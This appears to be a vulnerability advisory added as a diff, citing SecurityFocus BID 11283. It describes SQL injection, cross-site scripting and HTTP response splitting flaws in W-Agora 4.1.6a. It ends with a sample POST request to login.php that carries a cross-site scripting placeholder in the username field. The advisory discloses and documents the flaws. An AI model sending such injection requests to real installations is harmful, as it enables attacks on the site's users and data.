@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/11283/info
+  
+Multiple vulnerabilities are reported to affect the application. These issues arise due to insufficient sanitization of user-supplied data. A remote attacker may leverage these vulnerabilities to carry out SQL injection, cross-site scripting, and HTTP response splitting attacks.
+  
+These issues were identified in W-Agora 4.1.6a, however, it is possible that other versions are also affected.
+
+POST /login.php HTTP/1.1
+Host: w-agora
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 89
+loginform=1&redirect_url=1&loginuser=[XSS code here]&loginpassword=1
